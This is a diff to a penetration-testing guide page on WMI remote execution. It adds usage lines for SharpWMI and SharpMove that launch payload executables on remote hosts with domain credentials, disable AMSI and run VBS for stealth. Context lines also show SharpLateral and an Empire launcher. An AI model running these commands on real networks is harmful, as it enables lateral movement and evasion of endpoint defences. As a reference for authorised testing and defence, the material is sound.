@@ -115,10 +115,6 @@ wmic /node:hostname /user:user path win32_process call create "empire launcher s
 
 This process illustrates WMI's capability for remote execution and system enumeration, highlighting its utility for both system administration and penetration testing.
 
-## References
-
-- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
-
 ## Automatic Tools
 
 - [**SharpLateral**](https://github.com/mertdas/SharpLateral):
@@ -126,6 +122,30 @@ This process illustrates WMI's capability for remote execution and system enumer
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
+
+- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
+
+```bash
+SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
+# Stealthier execution with VBS
+SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
+```
+
+- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
+
+```bash
+SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
+SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
+SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
+```
+
+- You could also use **Impacket's `wmiexec`**.
+
+
+## References
+
+- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+
 
 {{#include ../../banners/hacktricks-training.md}}
 
